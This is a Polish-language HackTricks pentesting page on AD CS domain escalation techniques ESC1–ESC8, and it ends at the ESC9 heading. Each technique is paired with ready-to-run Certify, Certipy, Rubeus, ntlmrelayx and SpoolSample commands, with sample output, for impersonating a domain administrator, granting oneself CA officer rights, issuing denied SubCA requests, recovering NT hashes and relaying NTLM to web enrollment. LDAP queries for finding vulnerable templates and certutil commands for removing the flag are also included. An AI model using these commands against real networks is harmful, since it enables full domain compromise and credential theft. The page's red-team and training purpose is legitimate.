# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**To jest podsumowanie sekcji technik eskalacji z postów:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Źle skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Źle skonfigurowane szablony certyfikatów - ESC1 wyjaśnione

* **Prawa do rejestracji są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.**
* **Zgoda menedżera nie jest wymagana.**
* **Nie są potrzebne podpisy od upoważnionego personelu.**
* **Deskriptory zabezpieczeń na szablonach certyfikatów są zbyt liberalne, co pozwala użytkownikom o niskich uprawnieniach uzyskać prawa do rejestracji.**
* **Szablony certyfikatów są skonfigurowane w celu zdefiniowania EKU, które ułatwiają uwierzytelnianie:**
* Identyfikatory Extended Key Usage (EKU) takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA) są uwzględnione.
* **Możliwość dla wnioskodawców do dołączenia subjectAltName w żądaniu podpisania certyfikatu (CSR) jest dozwolona przez szablon:**
* Active Directory (AD) priorytetowo traktuje subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR, można zażądać certyfikatu do podszywania się pod dowolnego użytkownika (np. administratora domeny). To, czy wnioskodawca może określić SAN, jest wskazane w obiekcie AD szablonu certyfikatu przez właściwość `mspki-certificate-name-flag`. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala wnioskodawcy na określenie SAN.

{% hint style="danger" %}
Skonfigurowanie opisane powyżej pozwala użytkownikom o niskich uprawnieniach na żądanie certyfikatów z dowolnym wybranym SAN, co umożliwia uwierzytelnianie jako dowolny podmiot domeny przez Kerberos lub SChannel.
{% endhint %}

Funkcja ta jest czasami włączana, aby wspierać generację certyfikatów HTTPS lub hostów w locie przez produkty lub usługi wdrożeniowe, lub z powodu braku zrozumienia.

Zauważono, że utworzenie certyfikatu z tą opcją wywołuje ostrzeżenie, co nie ma miejsca, gdy istniejący szablon certyfikatu (taki jak szablon `WebServer`, który ma włączoną `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) jest duplikowany, a następnie modyfikowany w celu uwzględnienia OID uwierzytelniania.

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, możesz uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę lukę do podszywania się pod administratora**, można uruchomić:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go do **uwierzytelnienia za pomocą Rubeus lub certipy** ponownie:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaries Windows "Certreq.exe" i "Certutil.exe" mogą być używane do generowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracja szablonów certyfikatów w schemacie konfiguracji lasu AD, szczególnie tych, które nie wymagają zatwierdzenia lub podpisów, posiadających EKU Client Authentication lub Smart Card Logon oraz z włączonym flagą `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, może być przeprowadzona poprzez uruchomienie następującego zapytania LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Źle skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariantem pierwszego:

1. Prawa do rejestracji są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.
2. Wymóg zatwierdzenia przez menedżera jest wyłączony.
3. Wymóg autoryzowanych podpisów jest pomijany.
4. Zbyt liberalny opis zabezpieczeń na szablonie certyfikatu przyznaje prawa do rejestracji certyfikatów użytkownikom o niskich uprawnieniach.
5. **Szablon certyfikatu jest zdefiniowany tak, aby obejmował Any Purpose EKU lub nie miał EKU.**

**Any Purpose EKU** pozwala na uzyskanie certyfikatu przez atakującego w **dowolnym celu**, w tym uwierzytelnianie klienta, uwierzytelnianie serwera, podpisywanie kodu itp. Ta sama **technika używana w ESC3** może być wykorzystana do wykorzystania tego scenariusza.

Certyfikaty z **brakiem EKU**, które działają jako certyfikaty podrzędnych CA, mogą być wykorzystywane w **dowolnym celu** i mogą **również być używane do podpisywania nowych certyfikatów**. W związku z tym atakujący mógłby określić dowolne EKU lub pola w nowych certyfikatach, wykorzystując certyfikat podrzędnego CA.

Jednak nowe certyfikaty utworzone do **uwierzytelniania domeny** nie będą działać, jeśli podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Niemniej jednak atakujący może nadal tworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Mogłyby one być potencjalnie **nadużywane** do szerokiego zakresu celów (np. podpisywanie kodu, uwierzytelnianie serwera itp.) i mogłyby mieć znaczące konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.

Aby wyliczyć szablony, które pasują do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Źle skonfigurowane szablony agentów rejestracji - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** **inny EKU** (Agent Żądania Certyfikatu) oraz **2 różne szablony** (dlatego ma 2 zestawy wymagań),

**EKU Agenta Żądania Certyfikatu** (OID 1.3.6.1.4.1.311.20.2.1), znany jako **Agent Rejestracji** w dokumentacji Microsoft, pozwala podmiotowi **zarejestrować** **certyfikat** w **imieniu innego użytkownika**.

**„agent rejestracji”** rejestruje się w takim **szablonie** i używa uzyskanego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Następnie **wysyła** **współpodpisany CSR** do CA, rejestrując się w **szablonie**, który **zezwala na „rejestrację w imieniu”**, a CA odpowiada **certyfikatem należącym do „innego” użytkownika**.

**Wymagania 1:**

* Prawa do rejestracji są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.
* Wymóg zatwierdzenia przez menedżera jest pomijany.
* Brak wymogu autoryzowanych podpisów.
* Opis zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny, przyznając prawa do rejestracji użytkownikom o niskich uprawnieniach.
* Szablon certyfikatu zawiera EKU Agenta Żądania Certyfikatu, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych podmiotów.

**Wymagania 2:**

* Enterprise CA przyznaje prawa do rejestracji użytkownikom o niskich uprawnieniach.
* Zatwierdzenie przez menedżera jest pomijane.
* Wersja schematu szablonu to 1 lub przekracza 2, a on określa Wymóg Wydania Polityki Aplikacji, który wymaga EKU Agenta Żądania Certyfikatu.
* EKU zdefiniowane w szablonie certyfikatu zezwala na uwierzytelnianie w domenie.
* Ograniczenia dla agentów rejestracji nie są stosowane w CA.

### Wykorzystanie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **użytkownicy**, którzy mają prawo do **uzyskania** **certyfikatu agenta rejestracji**, szablony, w których agenci rejestracji mogą się rejestrować, oraz **kont** w imieniu których agent rejestracji może działać, mogą być ograniczeni przez korporacyjne CA. Osiąga się to poprzez otwarcie **snap-in** `certsrc.msc`, **kliknięcie prawym przyciskiem myszy na CA**, **wybranie Właściwości**, a następnie **przejście** do zakładki „Agenci rejestracji”.

Należy jednak zauważyć, że **domyślne** ustawienie dla CA to „**Nie ograniczaj agentów rejestracji**.” Gdy ograniczenie dla agentów rejestracji jest włączone przez administratorów, ustawienie na „Ogranicz agentów rejestracji” pozostaje niezwykle liberalne. Umożliwia to dostęp **Wszystkim** do rejestracji we wszystkich szablonach jako ktokolwiek.

## Kontrola dostępu do szablonów certyfikatów - ESC4

### **Wyjaśnienie**

**Opis zabezpieczeń** na **szablonach certyfikatów** definiuje **uprawnienia**, które konkretne **podmioty AD** posiadają w odniesieniu do szablonu.

Jeśli **atakujący** posiada wymagane **uprawnienia** do **zmiany** **szablonu** i **wprowadzenia** jakichkolwiek **wykorzystywalnych błędów konfiguracyjnych** opisanych w **poprzednich sekcjach**, eskalacja uprawnień może być ułatwiona.

Znaczące uprawnienia stosowane do szablonów certyfikatów obejmują:

* **Właściciel:** Przyznaje domyślną kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
* **Pełna kontrola:** Umożliwia pełną władzę nad obiektem, w tym zdolność do zmiany dowolnych atrybutów.
* **Zapisz właściciela:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez atakującego.
* **Zapisz Dacl:** Umożliwia dostosowanie kontroli dostępu, potencjalnie przyznając atakującemu Pełną kontrolę.
* **Zapisz właściwość:** Upoważnia do edytowania dowolnych właściwości obiektu.

### Nadużycie

Przykład eskalacji uprawnień jak w poprzednim przypadku:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 to sytuacja, gdy użytkownik ma uprawnienia do zapisu nad szablonem certyfikatu. Może to być na przykład nadużyte do nadpisania konfiguracji szablonu certyfikatu, aby uczynić szablon podatnym na ESC1.

Jak widać w powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowy `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, wdrożyłem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto mały podgląd polecenia `shadow auto` Certipy do odzyskania NT hasha ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą jednego polecenia. Domyślnie **Certipy** nadpisze konfigurację, aby uczynić ją **wrażliwą na ESC1**. Możemy również określić **parametr `-save-old`, aby zapisać starą konfigurację**, co będzie przydatne do **przywracania** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Rozbudowana sieć powiązań opartych na ACL, która obejmuje kilka obiektów poza szablonami certyfikatów i urzędami certyfikacji, może wpłynąć na bezpieczeństwo całego systemu AD CS. Obiekty te, które mogą znacząco wpłynąć na bezpieczeństwo, obejmują:

* Obiekt komputera AD serwera CA, który może być skompromitowany za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
* Serwer RPC/DCOM serwera CA.
* Każdy obiekt lub kontener AD będący potomkiem w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje, ale nie ogranicza się do, kontenerów i obiektów takich jak kontener szablonów certyfikatów, kontener urzędów certyfikacji, obiekt NTAuthCertificates oraz kontener usług rejestracji.

Bezpieczeństwo systemu PKI może zostać skompromitowane, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad którymkolwiek z tych krytycznych komponentów.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Temat poruszony w [**poście CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) dotyczy również implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, jak opisano przez Microsoft. Ta konfiguracja, gdy jest aktywowana na Urzędzie Certyfikacji (CA), pozwala na włączenie **wartości zdefiniowanych przez użytkownika** w **alternatywnym nazwie podmiotu** dla **dowolnego żądania**, w tym tych skonstruowanych z Active Directory®. W związku z tym, ten przepis pozwala **intruzowi** na rejestrację za pomocą **dowolnego szablonu** skonfigurowanego do **uwierzytelniania** w domenie—szczególnie tych otwartych na rejestrację **użytkowników bez uprawnień**, jak standardowy szablon użytkownika. W rezultacie można zabezpieczyć certyfikat, umożliwiając intruzowi uwierzytelnienie jako administrator domeny lub **jakikolwiek inny aktywny podmiot** w domenie.

**Note**: Podejście do dodawania **alternatywnych nazw** do Żądania Podpisania Certyfikatu (CSR), za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (nazywanego „Pary Nazwa-Wartość”), stanowi **kontrast** w porównaniu do strategii wykorzystania SAN w ESC1. Tutaj różnica polega na **tym, jak informacje o koncie są enkapsulowane**—w atrybucie certyfikatu, a nie w rozszerzeniu.

### Abuse

Aby sprawdzić, czy ustawienie jest aktywowane, organizacje mogą wykorzystać następujące polecenie z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywne podejście może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) są w stanie wykryć tę błędną konfigurację i ją wykorzystać:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się **prawa administracyjne domeny** lub równoważne, można wykonać następujące polecenie z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flaga może zostać usunięta za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Po aktualizacjach zabezpieczeń z maja 2022 roku, nowo wydane **certyfikaty** będą zawierać **rozszerzenie zabezpieczeń**, które włącza właściwość **`objectSid`** wnioskodawcy. Dla ESC1, ten SID pochodzi z określonego SAN. Jednak dla **ESC6**, SID odzwierciedla **`objectSid`** wnioskodawcy, a nie SAN.\
Aby wykorzystać ESC6, system musi być podatny na ESC10 (Słabe mapowania certyfikatów), które priorytetowo traktuje **SAN nad nowym rozszerzeniem zabezpieczeń**.
{% endhint %}

## Kontrola dostępu do podatnej jednostki certyfikującej - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu dla jednostki certyfikującej jest utrzymywana przez zestaw uprawnień, które regulują działania CA. Te uprawnienia można zobaczyć, uzyskując dostęp do `certsrv.msc`, klikając prawym przyciskiem myszy na CA, wybierając właściwości, a następnie przechodząc do zakładki Zabezpieczenia. Dodatkowo, uprawnienia można enumerować za pomocą modułu PSPKI przy użyciu poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
To zapewnia wgląd w podstawowe prawa, mianowicie **`ManageCA`** i **`ManageCertificates`**, które odpowiadają rolom „administrator CA” i „menedżer certyfikatów” odpowiednio.

#### Nadużycie

Posiadanie praw **`ManageCA`** na urzędzie certyfikacji umożliwia głównemu użytkownikowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na specyfikację SAN w dowolnym szablonie, co jest kluczowym aspektem eskalacji domeny.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu **Enable-PolicyModuleFlag** w PSPKI, co pozwala na modyfikacje bez bezpośredniej interakcji z GUI.

Posiadanie praw **`ManageCertificates`** ułatwia zatwierdzanie oczekujących wniosków, skutecznie omijając zabezpieczenie „zatwierdzenie menedżera certyfikatów CA”.

Kombinacja modułów **Certify** i **PSPKI** może być wykorzystana do żądania, zatwierdzania i pobierania certyfikatu:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

{% hint style="warning" %}
W **poprzednim ataku** **`Manage CA`** uprawnienia zostały użyte do **włączenia** flagi **EDITF\_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia **ataku ESC6**, ale nie będzie to miało żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie ponownie uruchomiona. Kiedy użytkownik ma prawo dostępu **`Manage CA`**, użytkownik ma również prawo do **ponownego uruchomienia usługi**. Jednak **nie oznacza to, że użytkownik może ponownie uruchomić usługę zdalnie**. Ponadto, E**SC6 może nie działać od razu** w większości załatanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.
{% endhint %}

Dlatego przedstawiony jest tutaj inny atak.

Wymagania wstępne:

* Tylko **`ManageCA` uprawnienie**
* Uprawnienie **`Manage Certificates`** (może być przyznane z **`ManageCA`**)
* Szablon certyfikatu **`SubCA`** musi być **włączony** (może być włączony z **`ManageCA`**)

Technika opiera się na fakcie, że użytkownicy z prawem dostępu `Manage CA` _i_ `Manage Certificates` mogą **wydawać nieudane żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **wrażliwy na ESC1**, ale **tylko administratorzy** mogą się zarejestrować w szablonie. Tak więc, **użytkownik** może **zażądać** rejestracji w **`SubCA`** - co zostanie **odmówione** - ale **następnie wydane przez menedżera**.

#### Nadużycie

Możesz **przyznać sobie prawo dostępu `Manage Certificates`** dodając swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** może być **włączony na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne dla tego ataku, możemy zacząć od **zażądania certyfikatu opartego na szablonie `SubCA`**.

**To żądanie zostanie odrzucone**, ale zapiszemy klucz prywatny i zanotujemy identyfikator żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Z naszymi **`Manage CA` i `Manage Certificates`** możemy następnie **wydać nieudane żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
A na koniec możemy **pobrać wydany certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay do punktów końcowych AD CS HTTP – ESC8

### Wyjaśnienie

{% hint style="info" %}
W środowiskach, w których **zainstalowane jest AD CS**, jeśli istnieje **punkt końcowy rejestracji internetowej podatny** i przynajmniej jeden **szablon certyfikatu jest opublikowany**, który zezwala na **rejestrację komputerów domenowych i uwierzytelnianie klientów** (takich jak domyślny **`Machine`**), możliwe jest, aby **jakikolwiek komputer z aktywną usługą spoolera został skompromitowany przez atakującego**!
{% endhint %}

Kilka **metod rejestracji opartych na HTTP** jest obsługiwanych przez AD CS, udostępnionych przez dodatkowe role serwera, które mogą być instalowane przez administratorów. Te interfejsy do rejestracji certyfikatów opartych na HTTP są podatne na **ataki NTLM relay**. Atakujący, z **skomprymowanej maszyny, może podszyć się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM**. Podszywając się pod konto ofiary, te interfejsy internetowe mogą być wykorzystywane przez atakującego do **żądania certyfikatu uwierzytelniania klienta przy użyciu szablonów certyfikatów `User` lub `Machine`**.

* **Interfejs rejestracji internetowej** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`), domyślnie obsługuje tylko HTTP, co nie zapewnia ochrony przed atakami NTLM relay. Dodatkowo, wyraźnie zezwala tylko na uwierzytelnianie NTLM przez nagłówek HTTP Authorization, co sprawia, że bardziej bezpieczne metody uwierzytelniania, takie jak Kerberos, są nieodpowiednie.
* **Usługa rejestracji certyfikatów** (CES), **Polityka rejestracji certyfikatów** (CEP) Web Service oraz **Usługa rejestracji urządzeń sieciowych** (NDES) domyślnie obsługują uwierzytelnianie negotiate przez swój nagłówek HTTP Authorization. Uwierzytelnianie negotiate **obsługuje zarówno** Kerberos, jak i **NTLM**, co pozwala atakującemu na **obniżenie poziomu do uwierzytelniania NTLM** podczas ataków relay. Chociaż te usługi internetowe domyślnie włączają HTTPS, HTTPS sam w sobie **nie chroni przed atakami NTLM relay**. Ochrona przed atakami NTLM relay dla usług HTTPS jest możliwa tylko wtedy, gdy HTTPS jest połączone z wiązaniem kanałów. Niestety, AD CS nie aktywuje Rozszerzonej Ochrony dla Uwierzytelniania na IIS, co jest wymagane do wiązania kanałów.

Powszechnym **problemem** z atakami NTLM relay jest **krótki czas trwania sesji NTLM** oraz niemożność atakującego do interakcji z usługami, które **wymagają podpisywania NTLM**.

Niemniej jednak, to ograniczenie jest przezwyciężane poprzez wykorzystanie ataku NTLM relay do uzyskania certyfikatu dla użytkownika, ponieważ okres ważności certyfikatu dyktuje czas trwania sesji, a certyfikat może być używany z usługami, które **wymagają podpisywania NTLM**. Aby uzyskać instrukcje dotyczące wykorzystania skradzionego certyfikatu, zapoznaj się z:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Innym ograniczeniem ataków NTLM relay jest to, że **maszyna kontrolowana przez atakującego musi być uwierzytelniona przez konto ofiary**. Atakujący może albo czekać, albo próbować **wymusić** to uwierzytelnienie:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Nadużycie**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` wylicza **włączone punkty końcowe HTTP AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez korporacyjne urzędy certyfikacji (CA) do przechowywania punktów końcowych usługi rejestracji certyfikatów (CES). Punkty te można analizować i wyświetlać, korzystając z narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycie z Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie składane przez Certipy na podstawie szablonu `Machine` lub `User`, w zależności od tego, czy nazwa konta, które jest przekazywane, kończy się na `$`. Określenie alternatywnego szablonu można osiągnąć za pomocą parametru `-template`.

Technika taka jak [PetitPotam](https://github.com/ly4k/PetitPotam) może być następnie wykorzystana do wymuszenia uwierzytelnienia. W przypadku kontrolerów domeny wymagane jest określenie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

